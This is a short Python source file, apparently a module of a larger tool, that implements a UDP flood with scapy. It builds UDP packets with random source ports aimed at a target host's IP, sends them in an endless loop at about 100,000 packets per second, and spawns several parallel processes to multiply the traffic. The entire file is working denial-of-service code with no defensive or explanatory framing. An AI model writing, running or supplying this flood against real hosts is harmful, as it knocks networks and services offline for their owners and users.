from utils.host import Host
from scapy.all import IP, UDP, RandShort, sendpfast
import multiprocessing


def udp_flood(host: Host, port: int = 0):
    while True:
        packet = IP(dst=host.ip) / UDP(dport=port, sport=RandShort())
        sendpfast(packet, pps=100000, loop=1, inter=0.0001, iface=None)


def start_udp_flood(host: Host, port: int = 0, threads: int = 1):
    process_list = []
    for i in range(threads):
        process = multiprocessing.Process(target=udp_flood, args=(host, port))
        process_list.append(process)
        process.start()

    for process in process_list:
        process.join()
